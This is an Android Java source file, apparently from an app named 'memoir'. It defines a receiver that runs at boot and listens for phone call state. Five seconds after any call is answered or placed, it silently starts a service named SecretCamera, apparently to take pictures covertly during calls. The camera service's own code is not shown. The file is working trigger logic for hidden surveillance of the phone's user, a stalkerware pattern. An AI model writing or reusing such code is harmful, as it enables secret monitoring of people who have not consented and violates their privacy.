package com.krystal.memoir;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

import com.krystal.memoir.services.SecretCamera;

public class BootupBroadcastReceiver extends BroadcastReceiver {

	private TelephonyManager mTelephonyManager = null;
	private Context mContext = null;

	private PhoneStateListener mPhoneListener = new PhoneStateListener() {
		public void onCallStateChanged(int state, String incomingNumber) {
			try {
				switch (state) {
				case TelephonyManager.CALL_STATE_RINGING:
					break;
				case TelephonyManager.CALL_STATE_OFFHOOK:
					Handler handler = new Handler();
					handler.postDelayed(new Runnable() {

						@Override
						public void run() {
							Intent intent = new Intent(mContext,
									SecretCamera.class);
							mContext.startService(intent);
						}
					}, 5000);
					break;
				case TelephonyManager.CALL_STATE_IDLE:
					break;
				default:
					break;
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	};

	@Override
	public void onReceive(Context context, Intent arg1) {
		mContext = context;
		mTelephonyManager = (TelephonyManager) context
				.getSystemService(Context.TELEPHONY_SERVICE);
		mTelephonyManager.listen(mPhoneListener,
				PhoneStateListener.LISTEN_CALL_STATE);
	}
}
